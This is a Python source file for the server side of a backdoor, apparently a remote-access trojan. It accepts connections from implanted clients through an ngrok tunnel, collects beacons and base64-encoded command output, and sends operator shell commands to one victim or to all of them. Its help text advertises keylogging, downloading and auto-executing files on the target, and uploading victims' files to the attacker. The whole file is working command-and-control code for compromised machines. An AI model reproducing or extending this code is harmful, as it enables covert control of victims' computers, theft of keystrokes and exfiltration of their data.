"""
Listener starts by using ngrok tcp 4444 to create a tunnel to the targets machine. 
It then listens for incoming connections on the specified port and handles them accordingly.

"""

import os
import socket
import threading
import base64



# Define IP and port to listen on
IP = "0.0.0.0" # Host IP
PORT = 4444 # Port for conenction

# Dictionary to store connected clients
clients = {}

# Handles an individual client connection and processes incoming payload messages.
# Preconditions: client_socket is a connected socket and client_address identifies the client.
# Postconditions: Processes incoming messages, prints decoded responses, removes the client on disconnect.
# Pseudocode:
# 1. Build a client key string from the address and port
# 2. Store the client socket in the clients dictionary
# 3. Loop while receiving data from the client
# 4. Decode the message and route based on its prefix
# 5. On disconnect or error, close the socket and remove the client

def handle_client(client_socket, client_address):

  # Store client for sending commands
  client_key = f"{client_address[0]}:{client_address[1]}"
  print(f'[*] Connection made with: {client_key}')
  clients[client_key] = client_socket  

  try:
    while True:
      data = client_socket.recv(4096)
      if not data:
        break

      request = data.decode('utf-8', errors='ignore').strip()

      # Handle command results from payload
      if request.startswith("CMD_RES|"):
        try:
          encoded = request[8:]  # Remove "CMD_RES|"
          decoded_bytes = base64.b64decode(encoded)
          real_output = decoded_bytes.decode('utf-8')
          print(f"\n[+] Command Output from {client_key}:")
          print(real_output)
          print("-" * 60)   # separator line
        except Exception as decode_error:
          print(f"[!] Failed to decode output: {decode_error}")
          print(f"Raw: {request}")

      # Handle error messages from payload
      elif request.startswith("CMD_ERR|"):
        error_msg = request[8:]
        print(f"[!] Command Error from {client_key}: {error_msg}")

      # Handle beacon
      elif request.startswith("BKDR_ALIVE|"):
        print(f"[+] Beacon received from {client_key}: {request}")

      # Everything else (including the old cwd message)
      else:
        print(f'[*] Received from {client_key}: {request}')

  except Exception as e:
    print(f'[!] Error with {client_key}: {e}')
  finally:
    client_socket.close()
    if client_key in clients:
      del clients[client_key]
    print(f'[*] Client {client_key} disconnected. Remaining: {len(clients)}')

# Starts the listener server, accepts incoming client connections, and spawns handlers for each client.
# Preconditions: IP and PORT are configured, socket binding is permitted, and ngrok tunnel is running if used.
# Postconditions: Listener accepts multiple clients and maintains the clients dictionary while reporting connection count.
# Pseudocode:
# 1. Create a TCP socket and bind it to IP:PORT
# 2. Enable address reuse and begin listening
# 3. Accept incoming connections in a loop
# 4. For each connection, start handle_client in a new thread
# 5. Store the connected client socket and print the total count

def start_listener():
  # Creates a TCP server and bind it to IP and PORT
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
    listener.bind((IP, PORT))
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.listen()

    # Prints connection
    print(f'[*] Server listening on {IP}:{PORT}')

    while True:
      # Accept client connection
      sock, addr = listener.accept() 

      # Create and start new thread to handle connection
      handle_thread = threading.Thread(target = handle_client, args = (sock, addr), daemon = True) 
      handle_thread.start() 

      # Add client connection in dictionary
      client_key = f"{addr[0]}:{addr[1]}"
      clients[client_key] = sock 

      # Print total number of connected clients 
      print(f'[*] Number of connected clients: {len(clients)}') 


# Run starat_listener
if __name__ == "__main__":
  
  # Print a message indicating that the listener is starting
  print("[*] Starting listener...") 

  # Print instructions for user input commands
  print("Commands Inputs: 'exit' to close connection with a client")
  print("/[IP:port] [command] to send a command to a specific client")
  print("/all [command] to send a command to all clients")
  print("")
  print("Available commands:")
  print("Shell Commands: Any native command (dir, ipconfig, whoami, etc.)")
  print("KEYLOG_START: Begins recording keystrokes on the target.")
  print("KEYLOG_STOP: Stops the keylogger and sends the log to the listener.")
  print("DOWNLOAD:<url>: Downloads a file from a URL to the target machine.")
  print("DOWNLOAD:<url> -e: Downloads and automatically executes the file.")
  print("UPLOAD:<filename>: Uploads a file from the target machine to the attacker.")

  #Creates a thread to run start_listener in the background
  starter_thread = threading.Thread(target = start_listener, daemon = True) 
  starter_thread.start()

  # Main thread will be used to send commands to clients, while the listener thread will continue to 
  # accept connections and print received data from clients
  # Logic to determine which client(s) to send the command based on user input

  while True: 
    cmd = input("Enter command to send to clients: ")
    # Check for / command to send to clients
    if cmd == '': continue
    if (cmd[0]== '/'):
      if (cmd[1:4] == "all"):
        command = cmd[5:] # Extract command from input

        for client in clients.values(): 
          client.send(command.encode("utf-8")) # Send command to each client
      else:
        address, command = cmd[1:].split(" ", 1) # Extract address and command from input
        if address in clients: 
          clients[address].send(command.encode("utf-8")) 
        else:
          # Acknowledges error by user with no client found given the address
          print(f'[*] No client found with address {address}')

    else: continue
    pass # Keep main thread running to allow listener to continue accepting connections





